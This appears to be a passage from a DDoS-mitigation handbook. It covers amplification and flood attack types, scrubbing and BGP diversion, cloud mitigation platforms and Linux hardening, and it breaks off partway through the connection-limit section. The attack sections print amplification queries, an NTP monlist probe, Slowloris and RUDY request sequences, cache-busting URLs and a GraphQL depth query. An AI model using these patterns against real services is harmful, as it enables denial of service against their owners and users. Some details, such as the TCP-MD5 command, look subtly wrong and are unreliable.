# 42 — DDoS Mitigation Infrastructure: Attack Types, Defense Architecture, and Incident Response

---

## Indice

1. [Tassonomia Attacchi DDoS](#1-tassonomia-attacchi-ddos)
2. [Architettura di Difesa](#2-architettura-di-difesa)
3. [Piattaforme di Mitigazione](#3-piattaforme-di-mitigazione)
4. [Network-Level Defenses](#4-network-level-defenses)
5. [Application-Level Defenses](#5-application-level-defenses)
6. [DNS DDoS Protection](#6-dns-ddos-protection)
7. [Testing e Red Team DDoS](#7-testing-e-red-team-ddos)
8. [Monitoraggio e Detection](#8-monitoraggio-e-detection)
9. [Incident Response per DDoS](#9-incident-response-per-ddos)
10. [Laboratorio Pratico](#10-laboratorio-pratico)

---

## 1. Tassonomia Attacchi DDoS

### 1.1 Volumetric Attacks

Volumetric attacks aim to saturate the target's available bandwidth by flooding it with enormous quantities of traffic. The attack traffic volume overwhelms the network pipe itself, making the service unreachable regardless of server capacity. These attacks are measured in bits per second (bps) and packets per second (pps).

#### UDP Flood

The simplest volumetric attack. Attackers send massive quantities of UDP datagrams to random ports on the target. Since UDP is connectionless, no handshake is required — the attacker simply blasts packets. The target must process each packet to determine if an application is listening on that port, then generate ICMP Destination Unreachable messages (until rate-limited), consuming CPU and bandwidth.

**Attack characteristics:**

- Spoofed source IPs make filtering by source address ineffective
- Random destination ports force per-packet processing
- No state required on attacker side — extremely cheap to generate
- Amplification not inherent but easily combined with reflection

**Traffic signature:**

```
UDP src=<random_spoofed> dst=target:random_port len=1400
UDP src=<random_spoofed> dst=target:random_port len=1400
UDP src=<random_spoofed> dst=target:random_port len=1400
```

#### DNS Amplification

Exploits open DNS resolvers as amplification reflectors. The attacker sends small DNS queries (typically 60-70 bytes) with the source IP spoofed to the victim's address. The resolver responds with large DNS responses (up to 4000+ bytes with EDNS0) directed at the victim. Amplification factor: **28-54x**.

**Attack mechanics:**

1. Attacker identifies open DNS resolvers (millions exist globally)
2. Crafts queries requesting large records (ANY, TXT, DNSSEC-signed zones)
3. Spoofs source IP to victim's address
4. Resolver sends amplified response to victim

**Query that maximizes amplification:**

```
dig ANY isc.org @open_resolver +edns=0 +bufsize=4096
```

A 64-byte query generates a 3,400+ byte response — a 53x amplification factor. With thousands of reflectors, a 1 Gbps attacker command channel produces 50+ Gbps at the victim.

#### NTP Amplification

Exploits the NTP `monlist` command on misconfigured NTP servers. The `monlist` command returns the last 600 clients that contacted the server. A 234-byte request generates responses of 48,000+ bytes. Amplification factor: **556x** (historically the highest before memcached).

**Attack vector:**

```
ntpdc -n -c monlist <vulnerable_ntp_server>
```

**Mitigation at source (NTP server):**

```
# In ntp.conf — disable monlist
disable monitor

# Or restrict queries
restrict default kod nomodify notrap nopeer noquery
restrict -6 default kod nomodify notrap nopeer noquery
```

#### Memcached Reflection

Discovered in late 2017, memcached reflection produces the highest amplification factors ever recorded: **10,000-51,000x**. Memcached servers exposed on UDP port 11211 respond to `stats` or `get` commands with massive payloads. A 15-byte request can trigger a multi-megabyte response.

**Why memcached is devastating:**

- Default installation listens on all interfaces including UDP
- No authentication required
- Responses can be megabytes in size (cached values)
- Amplification factor exceeds 50,000x in worst cases
- Responsible for the 1.35 Tbps GitHub attack (February 2018)

**Mitigation at source:**

```bash
# Disable UDP in memcached
# In /etc/memcached.conf
-U 0          # Disable UDP listener
-l 127.0.0.1  # Bind to localhost only
```

#### CLDAP Reflection

Connection-less Lightweight Directory Access Protocol (CLDAP) on UDP port 389 provides amplification factors of **56-70x**. Attackers query exposed Active Directory domain controllers with crafted CLDAP searches. The response contains full directory information, significantly larger than the query.

**Attack payload:**

```
# CLDAP query targeting rootDSE
# 52-byte query → 3,600+ byte response
```

**Network defense:**

- Block inbound UDP/389 at perimeter
- Never expose domain controllers directly to the internet
- Use firewall rules to restrict LDAP to known internal subnets

### 1.2 Protocol Attacks

Protocol attacks exploit weaknesses in Layer 3/4 protocol mechanics. Rather than saturating bandwidth, they exhaust state tables, connection limits, and processing capacity on network infrastructure (firewalls, load balancers, servers).

#### SYN Flood

The classic protocol attack. Exploits TCP's three-way handshake by sending massive volumes of SYN packets without completing the handshake. Each SYN forces the target to allocate a Transmission Control Block (TCB) — typically 280+ bytes of kernel memory — and maintain it until timeout (usually 75 seconds). With spoofed source IPs, the SYN-ACK goes nowhere, and half-open connections accumulate until the backlog queue is exhausted.

**State exhaustion mechanics:**

```
Attacker → SYN (spoofed src) → Target
Target → SYN-ACK → <spoofed IP, no reply>
Target: TCB allocated, timer started (75s default)
Target: backlog queue slot consumed
```

**Default Linux backlog:**

```bash
# Default tcp_max_syn_backlog
cat /proc/sys/net/ipv4/tcp_max_syn_backlog
# Typically 128 or 256 — trivially exhausted
```

A single machine can generate 100,000+ SYN packets/second. At 280 bytes per TCB with 75-second timeout, the target maintains ~21 GB of half-open state — impossible without SYN cookies.

#### ACK Flood

Sends massive volumes of TCP ACK packets. Since ACK packets do not initiate connections, they bypass SYN flood protections. The target must look up each ACK against its connection table. When no matching connection exists, an RST is generated, consuming CPU. Stateful firewalls suffer most — each ACK requires a table lookup, and non-matching ACKs may trigger logging.

**Impact on different devices:**

| Device | Impact |
|--------|--------|
| Server | CPU spent on conntrack lookup + RST generation |
| Stateful firewall | Connection table thrashing, potential state exhaustion |
| IDS/IPS | Alert fatigue, log volume explosion |
| Load balancer | Session lookup overhead |

#### TCP Reset Attack

Sends spoofed RST packets attempting to tear down existing legitimate connections. Requires guessing the correct sequence number (within the receive window). Against long-lived connections (BGP sessions, persistent HTTP/2), this can be devastating.

**BGP session targeting:**

```
# BGP uses TCP port 179 — known port
# Source/destination IPs are known (peering addresses)
# Only need sequence number within receive window (65535 bytes)
# For 100 Mbps link: ~17,000 guesses needed (feasible at high PPS)
```

**Defense: TCP-MD5 (RFC 2385) or TCP-AO (RFC 5925):**

```
# Linux BGP peer with TCP-MD5
ip tcp_metrics tcp-md5sig <peer_ip> <key>
```

#### IP Fragmentation Attack

Sends overlapping or incomplete IP fragments that exhaust the target's fragment reassembly buffer. The target must hold fragments in memory until all pieces arrive or the reassembly timeout expires (typically 30-60 seconds).

**Variants:**

- **Teardrop**: Overlapping fragments with conflicting offsets crash vulnerable IP stacks
- **Rose/Jolt**: Tiny fragments (8-byte payload) that maximize per-fragment overhead
- **Nestea**: Fragment offset manipulation causing memory corruption
- **Incomplete fragments**: First fragment arrives, subsequent ones never do — buffer held until timeout

### 1.3 Application-Layer Attacks (Layer 7)

Application-layer attacks are the most sophisticated. They mimic legitimate traffic patterns, making detection extremely difficult. Low volume (often under 100 Mbps) can bring down application servers by exhausting compute resources rather than bandwidth.

#### HTTP Flood

Sends legitimate-looking HTTP requests at high volume. Each request is syntactically valid, passes WAF inspection, and triggers full application processing (database queries, template rendering, business logic). GET floods target expensive endpoints; POST floods submit large payloads.

**Sophisticated HTTP flood characteristics:**

- Valid User-Agent headers rotated from real browser strings
- Proper Accept, Accept-Encoding, Accept-Language headers
- Cookie headers maintaining session state
- Referrer headers matching site navigation patterns
- TLS handshakes completed (cannot filter at TCP level)
- Requests target URLs that trigger expensive operations

**Cache-busting variant:**

```
GET /search?q=randomstring843792 HTTP/1.1
GET /product/detail?id=28473&variant=color&cache=no&rand=7284
GET /api/v2/search?query=aksdjhf&page=1&sort=random&_=1684329487
```

Each request has unique parameters, bypassing CDN caches and forcing origin processing.

#### Slowloris

Holds HTTP connections open by sending partial requests that never complete. The attacker opens many connections, sends valid HTTP headers slowly (one header line every 15-30 seconds), but never sends the final empty line that completes the request. The server keeps the connection open waiting for the complete request, exhausting its connection pool.

**Attack sequence:**

```
# Connection 1 (never completes):
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Header-1: value\r\n
# ... 15 second pause ...
X-Header-2: value\r\n
# ... 15 second pause ...
X-Header-3: value\r\n
# ... continues indefinitely
```

**Why it's effective:**

- Uses minimal bandwidth (bytes per second, not megabits)
- Single machine can exhaust connection pools (Apache default: 256 MaxClients)
- Connections appear legitimate during inspection
- Hard to distinguish from slow legitimate clients

#### RUDY (R-U-Dead-Yet)

Similar to Slowloris but targets HTTP POST requests. Sends a POST request with a legitimate Content-Length header indicating a large body, then transmits the body one byte at a time with long pauses between bytes. The server allocates resources for the full expected body and waits.

**Attack flow:**

```
POST /login HTTP/1.1
Host: target.com
Content-Length: 100000
Content-Type: application/x-www-form-urlencoded

a  ← one byte sent
# ... 10 second pause ...
b  ← one byte sent
# ... 10 second pause ...
c  ← one byte sent
```

#### API Abuse

Targets API endpoints that are computationally expensive. Unlike web page requests that might be cached, API calls often trigger unique database queries, complex business logic, or third-party service calls.

**High-impact API targets:**

- Search endpoints with complex queries: `/api/search?q=complex+boolean+expression`
- Report generation: `/api/reports/generate?date_range=5years&granularity=hourly`
- Export endpoints: `/api/users/export?format=pdf&include=all_history`
- GraphQL with deeply nested queries (query depth attack)

**GraphQL depth attack:**

```graphql
query {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
              posts {
                comments {
                  author {
                    friends { name }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### 1.4 Carpet Bombing

Instead of concentrating attack traffic on a single target IP, carpet bombing distributes traffic across an entire subnet (typically /24 or /16). Each individual IP receives traffic below typical detection thresholds, but the aggregate saturates the upstream link. This evades per-destination anomaly detection.

**Characteristics:**

- Traffic to each IP stays below 100 Mbps (below typical alert threshold)
- Aggregate across /24 subnet: 25.6 Gbps (256 IPs × 100 Mbps)
- Per-IP monitoring shows "normal" traffic levels
- Subnet-level monitoring reveals the attack
- ISP upstream link saturated regardless of per-host volume

**Detection requires:**

- Aggregate traffic monitoring at subnet/prefix level
- Interface utilization monitoring (upstream links)
- Baseline comparison across entire prefix ranges
- NetFlow analysis showing distributed pattern

### 1.5 Multi-Vector Attacks

Modern DDoS attacks rarely use a single vector. Sophisticated attackers combine volumetric, protocol, and application-layer attacks simultaneously or sequentially. The volumetric component saturates scrubbing center capacity, while application-layer attacks slip through during the confusion.

**Typical multi-vector sequence:**

1. **Reconnaissance**: Port scanning, DNS enumeration to map infrastructure
2. **Volumetric opener**: 500 Gbps UDP amplification to trigger scrubbing
3. **Protocol layer**: SYN flood targeting firewalls while scrubbing handles volumetric
4. **Application layer**: HTTP flood against origin servers that pass through scrubbing
5. **Adaptation**: Attack shifts vectors when mitigation engages

### 1.6 Historical Significant Attacks

#### Dyn DNS Attack (October 21, 2016)

- **Target**: Dyn managed DNS infrastructure
- **Magnitude**: Estimated 1.2 Tbps
- **Vector**: Mirai botnet — 100,000+ IoT devices (cameras, DVRs, routers)
- **Impact**: Twitter, Reddit, Netflix, GitHub, Spotify, Airbnb unreachable for hours
- **Significance**: Demonstrated that attacking DNS infrastructure creates cascading failures across the entire internet ecosystem. Single point of failure in shared DNS services.

#### GitHub Memcached Attack (February 28, 2018)

- **Target**: GitHub.com
- **Magnitude**: 1.35 Tbps peak, 126.9 million packets per second
- **Vector**: Memcached amplification (UDP port 11211)
- **Duration**: ~20 minutes of intense attack
- **Mitigation**: Akamai Prolexic rerouted traffic within 10 minutes
- **Significance**: Highest-bandwidth attack at the time. No botnet needed — pure amplification using ~9,000 misconfigured memcached servers.

#### AWS Shield Attack (February 2020)

- **Target**: Undisclosed AWS customer
- **Magnitude**: 2.3 Tbps
- **Vector**: CLDAP reflection
- **Mitigation**: AWS Shield Advanced absorbed the attack
- **Significance**: Largest volumetric attack publicly disclosed. Demonstrated that cloud-scale mitigation can absorb multi-terabit attacks.

#### Cloudflare Record Attacks (2023)

- **Magnitude**: 71 million requests per second (HTTP/2 Rapid Reset — October 2023)
- **Vector**: HTTP/2 Rapid Reset (CVE-2023-44487) — exploiting HTTP/2 stream multiplexing
- **Technique**: Opening and immediately resetting streams, allowing unlimited requests per connection
- **Significance**: Shifted the arms race to application-layer RPS rather than volumetric bandwidth. Demonstrated that protocol-level vulnerabilities can produce unprecedented request rates from relatively small botnets.

---

## 2. Architettura di Difesa

### 2.1 Deployment Models

#### On-Premise DDoS Mitigation

Dedicated hardware appliances deployed at the network edge (in front of firewalls). Inspects all inbound traffic in real-time. Effective against attacks smaller than the internet pipe — once upstream bandwidth is saturated, on-premise equipment cannot help because traffic never reaches it.

**Advantages:**

- Full traffic visibility and control
- No dependency on third-party services
- Low latency (inline processing)
- Data never leaves your network
- Works for attacks below link capacity

**Limitations:**

- Cannot mitigate attacks exceeding upstream bandwidth
- Expensive hardware (Arbor TMS: $100K-$500K+)
- Requires specialized staff for tuning
- Limited by physical link capacity (typically 1-10 Gbps)

#### Cloud Scrubbing

All traffic is diverted through a cloud-based scrubbing center during attacks (or always-on). The scrubbing center absorbs volumetric attacks using its massive distributed capacity (multi-terabit), cleans traffic, and forwards only legitimate packets to the origin.

**Advantages:**

- Multi-terabit absorption capacity
- No infrastructure investment
- Effective against attacks far exceeding your bandwidth
- Global distributed presence reduces latency
- Managed by specialized DDoS experts

**Limitations:**

- Added latency (traffic detour through scrubbing center)
- Ongoing subscription cost
- Origin IP exposure bypasses protection
- Dependency on third-party availability
- May require exposing SSL keys for L7 inspection

#### Hybrid Architecture

Combines on-premise appliances for immediate, always-on protection against smaller attacks with cloud scrubbing for volumetric attacks that exceed local capacity. Automated signaling triggers cloud scrubbing when attack volume crosses a threshold.

**Typical hybrid flow:**

```
Normal Traffic:
  Internet → ISP → On-Premise DDoS → Firewall → Servers

Small Attack (< pipe capacity):
  Internet → ISP → On-Premise DDoS [mitigating] → Firewall → Servers

Large Attack (> pipe capacity):
  Internet → Cloud Scrubbing → ISP → On-Premise DDoS → Firewall → Servers
  (BGP diversion activated when threshold exceeded)
```

### 2.2 Scrubbing Center Architecture

A scrubbing center performs four phases on diverted traffic:

#### Phase 1: Traffic Diversion

Traffic destined for the protected network is redirected to the scrubbing center. Methods include:

- **BGP route announcement**: Scrubbing center announces more-specific routes for protected prefixes
- **DNS-based diversion**: DNS records point to scrubbing center IPs (for web properties)
- **GRE/IPsec tunnels**: Encapsulated traffic forwarded to scrubbing center

#### Phase 2: Traffic Inspection

Deep packet inspection at line rate. Multi-stage analysis pipeline:

```
┌─────────────────────────────────────────────────────────┐
│                  INSPECTION PIPELINE                      │
├─────────────────────────────────────────────────────────┤
│  Stage 1: Protocol validation (malformed packet drop)    │
│  Stage 2: Rate limiting (per-source, per-protocol)       │
│  Stage 3: Signature matching (known attack patterns)     │
│  Stage 4: Behavioral analysis (baseline deviation)       │
│  Stage 5: Challenge-response (SYN proxy, JS challenge)   │
│  Stage 6: Application inspection (L7 deep analysis)      │
└─────────────────────────────────────────────────────────┘
```

#### Phase 3: Traffic Cleaning

Attack traffic is dropped; legitimate traffic passes. Cleaning techniques include:

- Invalid packet discard (malformed headers, impossible flag combinations)
- Rate limiting per source/destination/protocol combination
- SYN proxy (completes handshake on behalf of server)
- Challenge mechanisms (TCP reset, JavaScript challenge, CAPTCHA)
- Reputation-based filtering (known botnet IPs, Tor exit nodes)
- Geofencing (drop traffic from irrelevant geographic regions)

#### Phase 4: Re-injection

Clean traffic is forwarded to the origin via:

- **GRE tunnel**: Encapsulated traffic delivered to origin router
- **Direct peering**: If scrubbing center and origin share an IX
- **Dedicated link**: Private fiber between scrubbing center and customer
- **IPsec tunnel**: Encrypted delivery for sensitive environments

### 2.3 BGP-Based Traffic Diversion

#### Remote Triggered Blackhole (RTBH)

The nuclear option. Instructs upstream routers to drop ALL traffic to a specific IP or prefix. Effective at protecting collateral infrastructure but renders the target completely unreachable.

**RTBH announcement:**

```
# Announce /32 with blackhole community
neighbor <upstream> announce route <victim_ip>/32
  next-hop 192.0.2.1  # RFC 5737 documentation address (null route)
  community 65535:666  # Well-known blackhole community (RFC 7999)
```

**When to use RTBH:**

- Single IP under attack, rest of infrastructure must survive
- Attack volume exceeds all mitigation capacity
- Collateral damage to shared infrastructure is imminent
- Temporary measure while proper mitigation activates

#### BGP Flowspec (RFC 5575)

Surgical filtering using BGP to distribute traffic filtering rules across the network. Unlike RTBH (which drops everything), Flowspec can match on source/destination IP, port, protocol, packet length, DSCP, fragment flags — and apply actions (drop, rate-limit, redirect to VRF).

**Flowspec rule examples:**

```
# Drop UDP traffic to victim on port range 1-1024
flow {
  match destination <victim_ip>/32;
  match protocol udp;
  match destination-port 1-1024;
  then discard;
}

# Rate-limit DNS responses to victim at 100Mbps
flow {
  match destination <victim_ip>/32;
  match source-port 53;
  match protocol udp;
  then rate-limit 100m;
}

# Drop fragments to victim (anti-fragmentation attack)
flow {
  match destination <victim_ip>/32;
  match fragment is-fragment;
  then discard;
}

# Redirect NTP traffic to scrubbing VRF
flow {
  match destination <victim_ip>/32;
  match source-port 123;
  match protocol udp;
  match packet-length >100;
  then redirect <scrubbing_vrf_rt>;
}
```

**Junos configuration for Flowspec:**

```
protocols {
    bgp {
        group flowspec-peers {
            type internal;
            family inet {
                flow {
                    no-validate FLOWSPEC-VALIDATE;
                }
            }
            neighbor 10.0.0.1;
        }
    }
}
routing-options {
    flow {
        route block-udp-flood {
            match {
                destination 203.0.113.10/32;
                protocol udp;
                destination-port 1-1024;
            }
            then discard;
        }
    }
}
```

#### Community-Based Scrubbing

Signal upstream ISPs using BGP communities to divert traffic through their scrubbing infrastructure. Each ISP defines communities for:

- **Scrubbing on**: Route traffic through DDoS mitigation platform
- **Scrubbing off**: Normal routing resumed
- **Selective blackhole**: Drop traffic from specific regions

```
# Example: Signal ISP to activate scrubbing (ISP-specific community)
route-map SIGNAL-SCRUB permit 10
  set community 174:990   # Cogent scrubbing community (example)

# Example: Regional blackhole (drop traffic from specific country)
route-map REGIONAL-BH permit 10
  set community 3356:9999 3356:123  # Lumen blackhole + region code
```

### 2.4 Anycast-Based Protection

Anycast announces the same IP prefix from multiple geographically distributed locations. Attack traffic is naturally distributed across all anycast nodes (following BGP best-path selection). No single node receives the full attack volume.

**How anycast absorbs DDoS:**

```
                    ┌──────────┐
          ┌───────→│ Node NYC │ (receives ~25% of attack)
          │        └──────────┘
          │        ┌──────────┐
Attack ───┼───────→│ Node LON │ (receives ~25% of attack)
(1 Tbps)  │        └──────────┘
          │        ┌──────────┐
          ├───────→│ Node TYO │ (receives ~25% of attack)
          │        └──────────┘
          │        ┌──────────┐
          └───────→│ Node SYD │ (receives ~25% of attack)
                   └──────────┘
```

Each node handles 250 Gbps instead of one node handling 1 Tbps. Combined with per-node scrubbing, anycast makes volumetric attacks significantly more expensive to execute.

### 2.5 CDN as DDoS Shield

Content Delivery Networks inherently provide DDoS protection through:

1. **Massive distributed capacity**: Cloudflare (248+ Tbps), Akamai (200+ Tbps)
2. **Anycast routing**: Attack distributed globally
3. **Caching**: Cached content served without origin contact
4. **Edge filtering**: WAF rules applied at edge before reaching origin
5. **Origin hiding**: Real origin IP masked behind CDN IPs

**CDN protection architecture:**

```
Client → CDN Edge (anycast) → [Cache Hit? Return cached]
                             → [Cache Miss? Origin fetch with connection pooling]

Attack → CDN Edge (anycast) → [Filtered at edge, never reaches origin]
```

### 2.6 Clean Pipe Service (ISP-Level)

ISPs offer "clean pipe" service where all traffic passes through ISP-operated scrubbing infrastructure before delivery to the customer. The customer receives only clean traffic on their access circuit.

**Advantages over customer-deployed mitigation:**

- Scrubbing happens upstream — attack never saturates customer's last-mile link
- ISP has visibility across entire customer base (better anomaly detection)
- No customer equipment investment
- Protection proportional to ISP's backbone capacity (multi-terabit)

---

## 3. Piattaforme di Mitigazione

### 3.1 Cloudflare

#### Magic Transit

Protects entire IP subnets (not just web properties). Customer announces their prefixes through Cloudflare's network. All traffic to those prefixes passes through Cloudflare's 248+ Tbps network for inspection.

**Architecture:**

```
1. Customer prefixes announced via Cloudflare (BGP)
2. All traffic enters Cloudflare's anycast network
3. L3/L4 DDoS mitigation applied at edge
4. Clean traffic forwarded via GRE/IPsec or CNI to origin
```

**API — enable Magic Transit prefix protection:**

```bash
# Create a prefix advertisement
curl -X POST "https://api.cloudflare.com/client/v4/accounts/{account_id}/addressing/prefixes/{prefix_id}/bgp/statuses" \
  -H "Authorization: Bearer ${CF_API_TOKEN}" \
  -H "Content-Type: application/json" \
  --data '{
    "advertised": true
  }'
```

#### Spectrum

Protects TCP/UDP applications (non-HTTP) — gaming servers, SSH, email, custom protocols.

```bash
# Create Spectrum application
curl -X POST "https://api.cloudflare.com/client/v4/zones/{zone_id}/spectrum/apps" \
  -H "Authorization: Bearer ${CF_API_TOKEN}" \
  -H "Content-Type: application/json" \
  --data '{
    "protocol": "tcp/22",
    "dns": {
      "type": "CNAME",
      "name": "ssh.example.com"
    },
    "origin_direct": ["tcp://203.0.113.10:22"],
    "ip_firewall": true
  }'
```

#### WAF DDoS Rules

L7 rate limiting and DDoS managed rules:

```bash
# Create rate limiting rule
curl -X POST "https://api.cloudflare.com/client/v4/zones/{zone_id}/rulesets" \
  -H "Authorization: Bearer ${CF_API_TOKEN}" \
  -H "Content-Type: application/json" \
  --data '{
    "name": "DDoS L7 Rate Limit",
    "kind": "zone",
    "phase": "http_ratelimit",
    "rules": [
      {
        "action": "block",
        "expression": "(http.request.uri.path contains \"/api/\")",
        "ratelimit": {
          "characteristics": ["cf.colo.id", "ip.src"],
          "period": 60,
          "requests_per_period": 100,
          "mitigation_timeout": 600
        }
      }
    ]
  }'
```

### 3.2 AWS Shield

#### Shield Standard (Free)

Automatically included with all AWS services. Provides protection against most common network and transport layer DDoS attacks:

- SYN flood protection via SYN proxying
- UDP reflection attack mitigation
- Automatic inline detection and mitigation
- No configuration required

#### Shield Advanced ($3,000/month + data transfer)

**Architecture:**

```
Internet → AWS Edge (CloudFront/Global Accelerator/Route 53)
         → Shield Advanced detection
         → Automatic mitigation
         → Application Load Balancer/EC2/EIP

Shield Response Team (SRT) available 24/7 for manual escalation
DDoS cost protection — AWS credits for scaling costs during attack
```

**Key capabilities:**

- Near real-time visibility into attacks (1-minute granularity metrics)
- AWS WAF integration at no additional cost
- Shield Response Team (SRT) access for manual engagement
- DDoS cost protection (credits for auto-scaling charges during attack)
- Health-based detection — correlates DDoS with application health
- Proactive engagement — SRT contacts you during detected attacks

**CloudFormation for Shield Advanced protection:**

```yaml
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  ShieldProtection:
    Type: AWS::Shield::Protection
    Properties:
      Name: ProductionALB
      ResourceArn: !Sub 'arn:aws:elasticloadbalancing:${AWS::Region}:${AWS::AccountId}:loadbalancer/app/production-alb/abc123'
      HealthCheckARNs:
        - !Sub 'arn:aws:route53:::healthcheck/${HealthCheckId}'

  ShieldDRTAccess:
    Type: AWS::Shield::DRTAccess
    Properties:
      RoleArn: !GetAtt ShieldDRTRole.Arn
      LogBucketList:
        - !Ref WAFLogBucket
```

### 3.3 Azure DDoS Protection

#### DDoS Protection Standard

Always-on monitoring with automatic mitigation for Azure resources. Uses machine learning trained on Azure's global traffic patterns to distinguish attacks from legitimate bursts.

**Key features:**

- Adaptive tuning based on application traffic profiles
- Multi-layered protection (L3/L4 at network edge, L7 via WAF)
- Attack analytics and reporting
- Integration with Azure Monitor and SIEM

**Terraform deployment:**

```hcl
resource "azurerm_network_ddos_protection_plan" "ddos_plan" {
  name                = "production-ddos-plan"
  location            = azurerm_resource_group.rg.location
  resource_group_name = azurerm_resource_group.rg.name
}

resource "azurerm_virtual_network" "vnet" {
  name                = "production-vnet"
  location            = azurerm_resource_group.rg.location
  resource_group_name = azurerm_resource_group.rg.name
  address_space       = ["10.0.0.0/16"]

  ddos_protection_plan {
    id     = azurerm_network_ddos_protection_plan.ddos_plan.id
    enable = true
  }
}
```

**Diagnostic settings for telemetry:**

```bash
az monitor diagnostic-settings create \
  --name "ddos-diagnostics" \
  --resource "/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Network/publicIPAddresses/{pip}" \
  --logs '[{"category":"DDoSProtectionNotifications","enabled":true},{"category":"DDoSMitigationFlowLogs","enabled":true},{"category":"DDoSMitigationReports","enabled":true}]' \
  --metrics '[{"category":"AllMetrics","enabled":true}]' \
  --workspace "/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.OperationalInsights/workspaces/{workspace}"
```

### 3.4 GCP Cloud Armor

Provides DDoS protection and WAF capabilities for applications behind Google Cloud Load Balancing.

**Adaptive Protection:**

Uses ML models to detect and mitigate L7 DDoS attacks by learning normal traffic baselines and identifying anomalies.

```bash
# Create security policy with DDoS rules
gcloud compute security-policies create ddos-policy \
  --description="DDoS mitigation policy"

# Enable adaptive protection
gcloud compute security-policies update ddos-policy \
  --enable-layer7-ddos-defense

# Add rate limiting rule
gcloud compute security-policies rules create 1000 \
  --security-policy=ddos-policy \
  --expression="true" \
  --action=rate-based-ban \
  --rate-limit-threshold-count=1000 \
  --rate-limit-threshold-interval-sec=60 \
  --ban-duration-sec=600 \
  --conform-action=allow \
  --exceed-action=deny-429 \
  --enforce-on-key=IP
```

### 3.5 Akamai Prolexic

Enterprise-grade DDoS mitigation with 20+ scrubbing centers globally and 20+ Tbps of dedicated mitigation capacity.

**Deployment modes:**

- **Always-on (routed)**: BGP-routed, all traffic passes through Prolexic continuously
- **On-demand**: Traffic diverted only during attack (BGP diversion triggered by monitoring)

**Architecture:**

```
Always-On Mode:
  Customer BGP announces through Prolexic → Prolexic scrubs 24/7 → GRE to origin

On-Demand Mode:
  Normal: Direct routing to customer
  Attack: Prolexic announces customer prefixes → scrubs → GRE to origin
  (Activation: manual/automated, typically < 10 minutes)
```

### 3.6 On-Premise Solutions

#### Arbor Networks (NETSCOUT) — Threat Mitigation System (TMS)

- Inline or out-of-band deployment
- 400 Gbps throughput per appliance (TMS HD1000)
- Integration with Arbor Sightline for NetFlow-based detection
- Automatic cloud signaling to Arbor Cloud for overflow

#### Radware DefensePro

- Behavioral-based detection (no signatures for zero-day attacks)
- Hardware-accelerated mitigation (FPGA-based)
- Hybrid Cloud integration (DefenseCloud)
- Sub-second detection and mitigation

#### F5 BIG-IP DDoS Hybrid Defender

- Inline L3-L7 DDoS protection
- Integration with F5 Silverline cloud scrubbing
- Application-layer behavioral analysis
- SSL/TLS inspection for encrypted attacks

---

## 4. Network-Level Defenses

### 4.1 Rate Limiting Implementations

#### Token Bucket Algorithm

Allows bursts up to bucket capacity while maintaining average rate. Tokens accumulate at a fixed rate; each packet consumes one token. If no tokens available, packet is dropped or queued.

**nftables implementation:**

```bash
#!/usr/bin/nft -f

table inet ddos_filter {
    chain input {
        type filter hook input priority filter; policy accept;

        # Rate limit new TCP connections: 25/second burst 50
        tcp flags syn limit rate 25/second burst 50 packets accept
        tcp flags syn counter drop

        # Rate limit ICMP: 10/second burst 20
        ip protocol icmp limit rate 10/second burst 20 packets accept
        ip protocol icmp counter drop

        # Rate limit UDP per source: 100/second
        udp dport != {53, 123} meter udp_rate { ip saddr limit rate 100/second burst 200 packets } accept
        udp dport != {53, 123} counter drop
    }
}
```

#### Leaky Bucket Algorithm

Smooths traffic to a constant rate — no bursts allowed. Packets enter a queue (bucket) and are released at a fixed rate. If the bucket overflows, excess packets are dropped.

**iptables implementation (hashlimit for per-source):**

```bash
# Per-source rate limiting using hashlimit
iptables -A INPUT -p tcp --dport 80 \
  -m hashlimit \
  --hashlimit-name http_rate \
  --hashlimit-above 50/sec \
  --hashlimit-burst 100 \
  --hashlimit-mode srcip \
  --hashlimit-htable-expire 30000 \
  -j DROP

# Per-source UDP rate limiting
iptables -A INPUT -p udp \
  -m hashlimit \
  --hashlimit-name udp_rate \
  --hashlimit-above 20/sec \
  --hashlimit-burst 40 \
  --hashlimit-mode srcip \
  --hashlimit-htable-expire 30000 \
  -j DROP
```

### 4.2 SYN Cookies — Kernel-Level Protection

SYN cookies eliminate the need to store state for half-open connections. Instead of allocating a TCB on SYN receipt, the server encodes connection parameters (MSS, timestamp, src/dst) into the ISN of the SYN-ACK. When the ACK returns, the server reconstructs the connection from the ISN — no state maintained during the handshake.

**Enable SYN cookies and tune parameters:**

```bash
# Enable SYN cookies (activated when SYN backlog fills)
sysctl -w net.ipv4.tcp_syncookies=1

# Increase SYN backlog (delay SYN cookie activation)
sysctl -w net.ipv4.tcp_max_syn_backlog=65535

# Reduce SYN-ACK retries (faster timeout for half-open connections)
sysctl -w net.ipv4.tcp_synack_retries=2

# Increase somaxconn (maximum socket backlog)
sysctl -w net.core.somaxconn=65535

# Reduce TCP FIN timeout
sysctl -w net.ipv4.tcp_fin_timeout=15

# Increase connection tracking table size
sysctl -w net.netfilter.nf_conntrack_max=2000000
sysctl -w net.netfilter.nf_conntrack_buckets=500000

# Reduce conntrack timeouts for faster cleanup
sysctl -w net.netfilter.nf_conntrack_tcp_timeout_syn_recv=30
sysctl -w net.netfilter.nf_conntrack_tcp_timeout_time_wait=30
```

**Persistent configuration (/etc/sysctl.d/99-ddos-hardening.conf):**

```ini
# SYN flood protection
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_max_syn_backlog = 65535
net.ipv4.tcp_synack_retries = 2
net.core.somaxconn = 65535

# Connection tracking
net.netfilter.nf_conntrack_max = 2000000
net.netfilter.nf_conntrack_tcp_timeout_syn_recv = 30
net.netfilter.nf_conntrack_tcp_timeout_time_wait = 30
net.netfilter.nf_conntrack_tcp_timeout_established = 600

# TCP hardening
net.ipv4.tcp_fin_timeout = 15
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_max_tw_buckets = 2000000

# ICMP rate limiting
net.ipv4.icmp_ratelimit = 1000
net.ipv4.icmp_ratemask = 6168

# Disable source routing
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0

# Enable reverse path filtering (BCP38)
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1

# Ignore ICMP redirects
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv4.conf.all.send_redirects = 0
```

### 4.3 TCP Connection Limits

**nftables connection limiting:**

```bash
